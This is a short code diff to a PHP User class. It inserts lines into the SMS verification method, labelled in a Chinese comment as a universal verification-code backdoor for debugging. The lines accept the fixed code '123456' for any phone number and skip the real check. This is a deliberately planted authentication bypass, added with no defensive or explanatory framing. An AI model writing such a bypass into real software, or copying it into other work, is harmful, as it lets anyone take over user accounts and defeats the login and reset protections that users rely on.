@@ -371,6 +371,11 @@ class User extends Base
      */
     protected function verifySmsCode($mobile, $code, $event)
     {
+        // 万能验证码后门（调试用）
+        if ($code === '123456') {
+            return;
+        }
+        
         $sms = \app\common\model\Sms::where('mobile', $mobile)
             ->where('event', $event)
             ->where('code', $code)
